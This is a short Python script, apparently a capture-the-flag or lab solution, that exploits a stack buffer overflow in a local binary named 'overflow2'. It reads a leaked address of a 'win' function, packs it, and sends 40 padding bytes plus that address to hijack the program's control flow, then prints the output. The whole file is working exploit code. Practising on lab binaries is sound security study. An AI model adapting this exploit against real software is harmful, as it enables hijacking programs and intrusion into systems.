import subprocess
import struct

def convert_address(address_str):
    address = int(address_str, 16) 
    return struct.pack("<Q", address) 


proc = subprocess.Popen(['./overflow2'], stdout=subprocess.PIPE, stdin=subprocess.PIPE)
output = proc.stdout.readline()  
win_address_str = output.decode().split(' ')[-1].strip()
win_address = convert_address(win_address_str) 


offset = 40 
payload = b'A' * offset + win_address


proc.stdin.write(payload)
proc.stdin.flush()


while True:
    line = proc.stdout.readline()
    if not line:
        break 
    print(line)

